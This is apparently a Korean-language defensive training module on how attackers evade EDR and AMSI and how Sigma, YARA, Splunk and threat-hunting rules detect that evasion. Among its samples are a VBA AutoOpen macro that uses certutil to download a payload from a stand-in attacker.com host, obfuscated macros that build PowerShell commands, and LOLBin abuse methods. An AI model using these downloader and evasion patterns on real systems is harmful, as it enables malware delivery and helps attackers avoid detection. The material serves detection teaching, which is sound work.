01

EDR 우회 기법 개론

🎯 학습 목표

중급에서 배운 탐지 메커니즘(Sysmon, YARA, ASR)을 공격자가 어떻게 우회하는지 이해하고, 방어자가 이에 대응하는 전략을 학습합니다.

왜 우회 기법을 배워야 하는가?

APT 그룹은 단순한 공격 도구를 사용하지 않습니다. 탐지 규칙을 연구하고 우회하는 것이 그들의 핵심 역량입니다. 방어자가 우회 기법을 이해하지 못하면, 새로운 변종이 등장할 때마다 무방비 상태가 됩니다.

EDR 탐지의 3가지 기둥

Userland Hooking

ntdll.dll 함수 인라인 후킹으로 API 호출 모니터링

→ 우회: Direct Syscall

ETW (Event Tracing)

커널 이벤트 추적으로 프로세스/네트워크 이벤트 수집

→ 우회: ETW Patching

Kernel Callbacks

PsSetCreateProcessNotifyRoutine 등 커널 콜백

→ 우회: Callback 제거 (드라이버 필요)

스피어피싱 컨텍스트에서의 우회 시나리오

═══ 중급 탐지 vs 고급 우회 매핑 ═══

중급 탐지                           고급 우회
─────────────────────              ─────────────────────
SEG 첨부파일 스캔              →   암호화 ZIP + 본문에 비밀번호
ASR 매크로 차단                →   DDE, SLK, XLL 등 비매크로 실행
Sysmon 프로세스 체인 탐지      →   프로세스 인젝션 (부모-자식 관계 파괴)
YARA 패턴 매칭                →   문자열 난독화, 패킹, 암호화 페이로드
Sigma 로그 탐지               →   LOLBins (정상 바이너리 악용)
AMSI 스크립트 스캔            →   AMSI 패치 (AmsiScanBuffer 무력화)

⚠️ 교육 목적 안내

이 과정의 우회 기법은 방어자가 탐지 규칙의 한계를 이해하기 위한 교육 목적입니다. 실제 환경에서의 무단 사용은 법적 책임을 수반합니다.

02

AMSI 바이패스 분석

🎯 학습 목표

AMSI(Antimalware Scan Interface)의 동작 원리와 공격자의 우회 기법을 분석하고, 이를 탐지하는 방어 전략을 학습합니다.

AMSI 동작 원리

AMSI는 Windows 10+에서 스크립트 엔진(PowerShell, VBScript, JScript)이 코드를 실행하기 직전에 보안 제품에 스캔을 요청하는 인터페이스입니다. 난독화된 스크립트도 최종 실행 시점에서 평문으로 스캔됩니다.

═══ AMSI 스캔 흐름 ═══

PowerShell 스크립트 실행 요청
       │
       ▼
┌─────────────────────────┐
│ 난독화 해제 (최종 평문)  │
└─────────────────────────┘
       │
       ▼
┌─────────────────────────┐
│ AmsiScanBuffer() 호출    │ ← amsi.dll 내 함수
│ → AV/EDR에 스캔 위임     │
└─────────────────────────┘
       │
       ▼
  판정: AMSI_RESULT_DETECTED → 실행 차단
        AMSI_RESULT_CLEAN    → 실행 허용

AMSI 바이패스 유형 (방어자 관점)

Type 1: AmsiScanBuffer 패치

amsi.dll의 AmsiScanBuffer 함수 시작 부분을 수정하여 항상 AMSI_RESULT_CLEAN을 반환하도록 변조. 탐지: Sysmon Event ID 7 (amsi.dll 로드) + ETW AMSI 이벤트 소실 감지

Type 2: amsiInitFailed 강제 설정

PowerShell의 내부 변수를 조작하여 AMSI 초기화 실패로 인식시킴. 탐지: ScriptBlock 로그에서 amsi 관련 리플렉션 호출 탐지

Type 3: CLM 우회 후 AMSI 비활성

Constrained Language Mode를 먼저 우회한 뒤 .NET 리플렉션으로 AMSI를 비활성. 탐지: PowerShell 4104 ScriptBlock 로그 + System.Reflection 키워드

방어: AMSI 바이패스 탐지 Sigma 규칙

# Sigma: AMSI 바이패스 시도 탐지
title: AMSI Bypass Attempt via PowerShell
logsource:
    product: windows
    category: ps_script
    definition: 'PowerShell ScriptBlock Logging (Event ID 4104)'
detection:
    selection:
        ScriptBlockText|contains:
            - 'AmsiScanBuffer'
            - 'amsiInitFailed'
            - 'AmsiUtils'
            - 'System.Management.Automation.AmsiUtils'
    condition: selection
level: high
tags:
    - attack.defense_evasion
    - attack.t1562.001

매크로 난독화 기법

🎯 학습 목표

공격자가 YARA/AV 시그니처를 우회하기 위해 사용하는 VBA 난독화 기법을 분석하고, 이를 탐지하는 방법을 학습합니다.

난독화 유형별 분석

① 문자열 분할 (String Concatenation)

' 원본 (YARA에서 "powershell" 탐지됨)
Shell "powershell -enc AAAA..."

' 난독화 (문자열 분할로 시그니처 우회)
Dim a As String: a = "pow" & "ers" & "he" & "ll"
Shell a & " -e" & "nc AA" & "AA..."

② Chr() 함수 인코딩

' "Shell" 문자열을 Chr() 숫자로 변환
Dim cmd As String
cmd = Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108)
' → "Shell" (S=83, h=104, e=101, l=108, l=108)

Application.Run cmd, "calc.exe"

③ 환경 변수 / 셀 참조 숨기기

' Excel: 숨겨진 시트의 셀에 명령어 조각 저장
' Hidden_Sheet!A1 = "powershell"
' Hidden_Sheet!A2 = "-enc"
' Hidden_Sheet!A3 = "base64_payload"

Dim cmd As String
cmd = Sheets("Hidden_Sheet").Range("A1") & " " & _
      Sheets("Hidden_Sheet").Range("A2") & " " & _
      Sheets("Hidden_Sheet").Range("A3")
Shell cmd

방어: olevba 정적 분석으로 난독화 탐지

# olevba로 난독화된 매크로 분석
$ olevba --decode obfuscated_doc.docm

VBA MACRO ThisDocument.cls
AutoExec: AutoOpen                        ← 자동 실행 트리거
Suspicious: Shell                         ← 시스템 명령 실행
Suspicious: Chr()                         ← 문자열 난독화
Suspicious: Hex Strings                   ← 16진수 인코딩
IOC: "powershell" (deobfuscated)          ← 난독화 해제 결과

💡 핵심 포인트

난독화는 정적 시그니처 탐지를 우회하지만, 동적 행위 분석(샌드박스, EDR)과 olevba 디코딩을 동시에 우회하기는 어렵습니다. 다층 분석이 핵심입니다.

04

Living-off-the-Land 바이너리

🎯 학습 목표

LOLBins(Living off the Land Binaries)의 개념을 이해하고, 피싱 공격에서 악용되는 주요 바이너리와 탐지 방법을 학습합니다.

LOLBins란?

LOLBins는 Windows에 기본 설치된 정상 바이너리를 공격 목적으로 악용하는 기법입니다. 서명된 Microsoft 바이너리이므로 AV/EDR 화이트리스트를 통과하며, 공격자가 별도 도구를 다운로드할 필요가 없습니다.

피싱에서 자주 악용되는 LOLBins

바이너리 정상 용도 악용 방식 MITRE ATT&CK
certutil.exe인증서 관리파일 다운로드 (-urlcache)T1105
mshta.exeHTA 실행스크립트 실행 (proxy execution)T1218.005
regsvr32.exeCOM 등록원격 SCT 파일 실행 (/s /u /i)T1218.010
rundll32.exeDLL 실행악성 DLL 로드T1218.011
bitsadmin.exe백그라운드 전송파일 다운로드 (/transfer)T1197

피싱 시나리오: 매크로 → certutil 다운로더

' VBA 매크로 (cmd.exe 대신 certutil 사용)
Sub AutoOpen()
    ' ASR 규칙이 cmd.exe/powershell.exe를 차단하므로
    ' certutil.exe를 사용하여 우회 시도
    Shell "certutil -urlcache -split -f " & _
          "http://attacker.com/payload.exe " & _
          "C:\Users\Public\update.exe"
End Sub

═══ Sysmon 탐지 ═══
Event ID 1: ParentImage=WINWORD.EXE → Image=certutil.exe
            CommandLine: certutil -urlcache -split -f http://...
Event ID 3: certutil.exe → attacker.com:80 (아웃바운드)

💡 방어 전략

LOLBins 탐지의 핵심은 "정상 바이너리의 비정상 사용 패턴"을 찾는 것입니다. certutil이 -urlcache와 함께 사용되거나, mshta가 원격 URL을 로드하는 것은 정상 업무에서 거의 발생하지 않습니다. LOLBAS Project(lolbas-project.github.io)에서 전체 목록을 참조할 수 있습니다.

Sigma YAML 고급 작성

🎯 학습 목표

중급의 기본 Sigma 규칙을 확장하여, 다중 조건, 시간 윈도우, 집계(aggregation)를 사용하는 고급 탐지 규칙을 작성합니다.

고급 Sigma: 다중 이벤트 상관분석

# 고급 Sigma: Office → LOLBin 체인 탐지 (우회 패턴 포함)
title: Office Application Spawns LOLBin - Advanced Evasion Detection
id: a1b2c3d4-5678-9012-3456-789012345678
status: stable
description: >
    Office 앱이 cmd/powershell 외에 certutil, mshta, regsvr32 등
    LOLBin을 생성하는 패턴을 탐지합니다.
    고급 공격자가 ASR 규칙을 우회하기 위해 사용하는 대안 바이너리입니다.

logsource:
    category: process_creation
    product: windows

detection:
    selection_parent:
        ParentImage|endswith:
            - '\WINWORD.EXE'
            - '\EXCEL.EXE'
            - '\POWERPNT.EXE'

    selection_lolbin:
        Image|endswith:
            - '\certutil.exe'
            - '\mshta.exe'
            - '\regsvr32.exe'
            - '\rundll32.exe'
            - '\bitsadmin.exe'
            - '\wmic.exe'
            - '\cmstp.exe'

    selection_suspicious_args:
        CommandLine|contains:
            - '-urlcache'
            - 'http://'
            - 'https://'
            - '/i:http'
            - '/transfer'

    condition: selection_parent and (selection_lolbin or selection_suspicious_args)

level: critical
tags:
    - attack.initial_access
    - attack.t1566.001
    - attack.defense_evasion
    - attack.t1218

Sigma → Splunk/Elastic 변환

# pySigma CLI로 변환
$ sigma convert -t splunk -p sysmon rules/office_lolbin.yml
→ 결과 (Splunk SPL):
ParentImage="*\\WINWORD.EXE" OR ParentImage="*\\EXCEL.EXE"
| search (Image="*\\certutil.exe" OR Image="*\\mshta.exe" ...)

$ sigma convert -t elasticsearch -p sysmon rules/office_lolbin.yml
→ 결과 (Elasticsearch Query DSL): JSON 형태

💡 핵심 포인트

중급에서 cmd.exe/powershell.exe만 탐지했다면, 고급에서는 공격자가 대안으로 사용하는 모든 LOLBin까지 커버합니다. 하지만 이 접근은 FP(오탐)가 증가할 수 있으므로, 반드시 falsepositives 섹션을 충실히 작성해야 합니다.

YARA 고급 규칙

🎯 학습 목표

난독화된 매크로 문서를 탐지하기 위한 고급 YARA 규칙(정규식, 조건 로직, 모듈)을 작성합니다.

난독화 탐지: Chr() 패턴 매칭

rule Obfuscated_VBA_Chr_Concat {
    meta:
        description = "Chr() 연결을 통한 VBA 난독화 탐지"
        author      = "ROOT14 SOC"
        mitre_att   = "T1027, T1566.001"

    strings:
        $ole2    = { D0 CF 11 E0 A1 B1 1A E1 }
        // Chr() 3번 이상 연결 패턴 (정규식)
        $chr_chain = /Chr\(\d+\)\s*&\s*Chr\(\d+\)\s*&\s*Chr\(\d+\)/ nocase
        // 자동 실행 트리거
        $auto    = /Auto(Open|Close|Exec|_Open)/ nocase

    condition:
        $ole2 at 0
        and #chr_chain > 3   // Chr() 체인이 3회 이상
        and $auto
}

엔트로피 기반 탐지

난독화/암호화된 코드는 엔트로피(정보 밀도)가 높습니다. YARA의 math 모듈로 파일 또는 섹션의 엔트로피를 계산하여 이상 탐지를 수행합니다.

import "math"

rule High_Entropy_VBA_Stream {
    meta:
        description = "VBA 스트림의 높은 엔트로피 탐지 (암호화/난독화 의심)"

    strings:
        $ole2 = { D0 CF 11 E0 A1 B1 1A E1 }
        $vba  = "VBA" ascii

    condition:
        $ole2 at 0
        and $vba
        and math.entropy(0, filesize) > 6.5  // 엔트로피 6.5 이상 → 의심
}

💡 핵심 포인트

고급 YARA에서는 단순 문자열 매칭을 넘어 정규식, 출현 횟수(#), 엔트로피를 조합합니다. 난독화는 특정 문자열을 숨기지만, 난독화 자체의 패턴(Chr 반복, 높은 엔트로피)은 새로운 탐지 포인트가 됩니다.

07

우회 공격 재탐지 전략

🎯 학습 목표

공격자의 우회 기법을 역으로 이용하여, 우회 행위 자체를 탐지하는 "메타 탐지" 전략을 설계합니다.

메타 탐지 원칙: "우회도 흔적을 남긴다"

공격자가 탐지를 우회하면, 우회 행위 자체가 새로운 이상 징후를 생성합니다. 예를 들어, AMSI를 패치하면 AMSI 이벤트가 갑자기 사라지는데, 이 "부재"가 탐지 포인트가 됩니다.

우회 기법 생성되는 이상 징후 재탐지 방법
AMSI 패치AMSI ETW 이벤트 소실AMSI 이벤트 부재 알림
Sysmon 언로드Sysmon 서비스 중단Sysmon heartbeat 모니터링
ETW 패치ntdll.dll 메모리 변조메모리 무결성 검사 (커널)
LOLBin 사용정상 바이너리의 비정상 인자CommandLine 이상 탐지
프로세스 인젝션비정상 메모리 할당Sysmon ID 8,10 + EDR

"부재의 탐지" (Absence Detection)

# Splunk: Sysmon heartbeat 부재 탐지 (5분 이상 이벤트 없으면 알림)
index=sysmon source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
| stats latest(_time) as last_event by host
| eval gap = now() - last_event
| where gap > 300
| table host, last_event, gap

# → Sysmon이 5분 이상 이벤트를 생성하지 않는 호스트 = 의심 대상

💡 핵심 포인트

고급 방어자는 "무엇이 있는가"뿐 아니라 "무엇이 없어졌는가"도 탐지합니다. 텔레메트리(Sysmon, AMSI, ETW)의 정상 베이스라인을 구축하고, 이 베이스라인에서 벗어나는 "침묵"을 경보로 전환합니다.

08

Detection Engineering 워크플로

🎯 학습 목표

Detection Engineering의 체계적 워크플로(가설 → 규칙 작성 → 테스트 → 배포 → 튜닝)를 학습합니다.

Detection Engineering 5단계

1

가설 수립 (Hypothesis)

"T1566.001 공격자가 LOLBin을 사용하면 어떤 로그가 생성될까?" → 위협 인텔리전스 + ATT&CK 매핑

2

규칙 작성 (Rule Development)

Sigma YAML 작성 → pySigma로 SIEM 쿼리 변환 → Git으로 버전 관리

3

테스트 (Validation)

Atomic Red Team으로 공격 시뮬레이션 실행 → 규칙이 탐지하는지 확인

4

배포 (Deployment)

프로덕션 SIEM에 적용 → 초기 1주일 Informational 레벨로 모니터링

5

튜닝 (Tuning)

FP(오탐) 분석 → 화이트리스트 추가 → 탐지율/오탐율 최적화

DaC (Detection as Code)

Detection as Code는 탐지 규칙을 소프트웨어 코드처럼 관리하는 접근입니다. Git 리포지토리에 Sigma 규칙을 저장하고, CI/CD 파이프라인으로 자동 테스트·배포합니다.

═══ Detection as Code 파이프라인 ═══

detection-rules/
├── sigma/
│   ├── T1566.001_office_child_process.yml
│   ├── T1566.001_office_lolbin.yml
│   └── T1566.001_amsi_bypass.yml
├── tests/
│   ├── T1566.001_atomic_test.yml    ← Atomic Red Team 테스트
│   └── expected_alerts.json
├── .github/workflows/
│   └── detection-ci.yml             ← PR 시 자동 검증
└── deploy/
    └── push-to-splunk.py            ← 승인 후 자동 배포

Threat Hunting 기초

🎯 학습 목표

기존 탐지 규칙이 놓칠 수 있는 위협을 능동적으로 찾아내는 Threat Hunting의 개념과 스피어피싱 관련 헌팅 쿼리를 학습합니다.

탐지(Detection) vs 헌팅(Hunting)

Detection (수동적)

사전 정의된 규칙이 알림 생성 → SOC 분석관이 조사. "알려진 위협"에 효과적

Hunting (능동적)

가설 기반으로 대량 로그를 탐색 → 규칙이 놓친 이상 발견. "알려지지 않은 위협"에 효과적

T1566.001 헌팅 쿼리 예제

# Hunting Query 1: 비정상 Office 자식 프로세스 (전수 조사)
index=sysmon EventCode=1
  (ParentImage="*\\WINWORD.EXE" OR ParentImage="*\\EXCEL.EXE")
| stats count by Image, CommandLine, host
| sort -count
| where count < 5
→ 드물게 발생하는 자식 프로세스 = 의심 대상

# Hunting Query 2: Office 프로세스의 외부 네트워크 연결
index=sysmon EventCode=3
  (Image="*\\WINWORD.EXE" OR Image="*\\EXCEL.EXE")
  NOT DestinationIp IN ("10.*","172.16.*","192.168.*","127.*")
| stats count by DestinationIp, DestinationPort, host
→ Office가 직접 외부 IP와 통신하면 비정상

# Hunting Query 3: 최근 7일 내 매크로 포함 파일 수신
index=email
  attachment_name="*.docm" OR attachment_name="*.xlsm"
| stats count by sender, recipient, attachment_name
| sort -count

헌팅 사이클 (OODA Loop)

Observe(로그 수집) → Orient(위협 인텔 + 가설) → Decide(쿼리 설계) → Act(실행 + 결과 분석). 발견된 패턴은 새 탐지 규칙으로 자동화하여 Detection Engineering 파이프라인에 통합합니다.

💡 핵심 포인트

Threat Hunting의 가치는 규칙이 아직 존재하지 않는 위협을 발견하는 것입니다. 헌팅에서 발견된 패턴 → Sigma 규칙 작성 → CI/CD 배포 → 자동 탐지. 이 순환이 조직의 탐지 성숙도를 높입니다.
